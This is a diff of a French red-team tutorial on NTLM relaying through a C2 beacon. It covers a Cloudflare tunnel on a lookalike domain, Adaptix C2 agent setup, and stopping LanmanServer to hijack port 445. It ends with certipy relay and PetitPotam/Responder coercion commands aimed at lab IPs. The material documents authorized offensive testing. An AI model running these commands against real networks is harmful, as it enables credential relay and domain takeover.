@@ -1,10 +1,8 @@
-# Coerce & Relay tunneling / binding
-
-## Objectif
+# Objectif
 
 Ci-dessous sont détaillées les étapes afin de pouvoir faire du NTLM relay au travers d'une session C2 pour les missions de Red Team. 
 
-## Pré-requis
+# Pré-requis
 
 - Un infrastructure "Red Team" comprenant ...
 - Un C2 (Sliver, Havoc, CS etc. ici, nous utiliserons [Adaptix C2](https://github.com/Adaptix-Framework/AdaptixC2))
@@ -13,9 +11,9 @@ Ci-dessous sont détaillées les étapes afin de pouvoir faire du NTLM relay au 
 - Une box kali (obviously)
 - Une session C2 (i.e. phishing ayant fonctionné et foothold dans l'infrastructure de la victime)
 
-## Préparation
+# Préparation
 
-### Tunnel Cloudflare
+## Tunnel Cloudflare
 
 Pour faire un tunnel Cloudflare, il faut avoir acheté un nom de domaine sur [GoDaddy](https://account.godaddy.com/) au préalable, puis renseigner dans les serveurs de noms les DNS Cloudflare `coleman.ns.cloudflare.com`, `melina.ns.cloudflare.com` (dans notre exemple, le domaine utilisé est `tickets-restaurant.net`)
 
@@ -42,7 +40,7 @@ Puis dans votre VM Kali, il suffit de lancer la commande copié un peu plus tôt
 
 Le tunnel Clouflare est maintenant fonctionnel.
 
-### Installation d'Adaptix C2
+## Installation d'Adaptix C2
 
 Voici la page Github d'Adaptix : https://github.com/Adaptix-Framework/AdaptixC2, il est également recommandé d'installer l'extension kit officiel : https://github.com/Adaptix-Framework/Extension-Kit
 
@@ -96,7 +94,7 @@ Cliquer sur `Listeners & Sites` et renseigner les champs comme suit (selon votre
 
 Puis dans l'onglet **Listeners**, cliquer droit sur le listener et cliquer sur `Generate agent`.
 
-## Relay your heart away
+# Relay your heart away
 
 Nous utiliserons ici la technique décrite dans ce [post](https://specterops.io/blog/2024/08/01/relay-your-heart-away-an-opsec-conscious-approach-to-445-takeover/?source=rss----f05f8696e3cc---4).
 
@@ -106,7 +104,7 @@ En effet le service LanmanServer s'occupe de l'écoute sur le port 445 et cela e
 
 On peut donc avec cette technique arrêter et désactiver les services afin que le système ne soit plus bindé au port 445 (sans avoir besoin de rebooter). Puis l'attaquant peut alors binder son propre listener C2 au port 445 de la machine compromise, puis restaurer les services.
 
-### Setup
+## Setup
 
 Il nous faut tout d'abord un Beacon sur une machine de l'infrastructure du client, puis élever nos privilèges au rang système afin de pouvoir désactiver les services (Ici exemple de beacon sur un serveur MSSQL et utilisation d'un Potato pour privesc sur la machine).
 
@@ -153,11 +151,11 @@ On peut réactiver le service **Lanman** :
 `shell sc config LanmanServer start=auto`
 ![reactivate_lanman](img/reactivate_lanman.png)
 
-### Relay
+## Relay
 
 On peut maintenant utiliser nos outils via proxychains et faire du relay.
 
-#### Exemple Certipy : 
+### Exemple Certipy : 
 `proxychains4 certipy relay -target 'rpc://192.168.56.23' -ca 'CORP-CA' -template 'DomainController'`
 
 ![certipy](img/certipy.png)
@@ -167,7 +165,7 @@ On peut maintenant utiliser nos outils via proxychains et faire du relay.
 ![petitpotam_certipy](img/petitpotam_certipy.png)
 
 
-#### Exemple Responder : 
+### Exemple Responder : 
 `sudo proxychains4 responder -I lo`
 
 `proxychains4 python3 ./PetitPotam.py 192.168.177.157 192.168.56.11 -u 'jon.snow' -p 'iknownothing'`
